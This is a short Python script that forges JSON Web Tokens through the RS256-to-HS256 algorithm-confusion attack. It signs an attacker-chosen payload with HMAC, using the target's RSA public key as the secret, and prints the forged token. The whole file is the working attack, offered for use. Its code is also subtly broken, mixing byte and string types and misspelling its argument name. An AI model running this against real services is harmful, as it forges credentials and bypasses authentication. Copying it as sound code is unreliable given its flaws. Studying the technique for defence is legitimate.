'''
JWT Signature - RS256 to HS256


Note: 'Make sure the public.pem file is on the same directory of the script

JWT tokens format is: <header>.<payload>.<secret>
I already define the header for HSA256 and the secret will be changed thats why
the input is only the payload.
'''


import binascii
import hmac
import hashlib
import base64
import argparse

header = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.'

def to_bytes(data):
    return data.encode('utf-8')
#Convert 
def pem_to_hex(filename):
    with open(filename, 'rb') as f:
        public_key = f.read()
        key = binascii.hexlify(public_key)
        return to_bytes(key)


if __name__ == "__main__":
    signed_string = ''
    jwt_payload = ''
    parser = argparse.ArgumentParser()
    parser.add_argument('--filename', type=str,
                        help='path with filename?')
    parser.add_argument('--paypload', type=str, default=1.0,
                        help='payload of jwt?')
    args = parser.parse_args()
    hex_key = pem_to_hex(args.filename)
    
    jwt_payload = header + args.paypload
    signed_string = hmac.new(hex_key, jwt_payload, hashlib.sha256).hexdigest()
  
    
    signed_string = to_bytes(signed_string)
    secret = base64.urlsafe_b64encode(binascii.a2b_hex(signed_string)).replace('=','')
    new_jwt_token = jwt_payload + '.' + secret
    print(new_jwt_token)